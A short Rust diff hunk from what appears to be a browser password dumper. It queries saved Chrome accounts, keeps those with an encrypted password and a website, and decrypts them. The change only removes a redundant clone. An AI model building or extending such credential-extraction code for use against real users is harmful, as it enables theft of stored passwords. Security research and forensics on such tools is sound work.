@@ -150,7 +150,7 @@ impl Dumper {
                 .query_accounts()?
                 .into_iter()
                 .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
-                .filter_map(|acc| DecryptedAccount::from_chrome_acc(acc.clone(), None).ok())
+                .filter_map(|acc| DecryptedAccount::from_chrome_acc(acc, None).ok())
                 .collect::<Vec<_>>();
 
             self.accounts.append(&mut accounts);
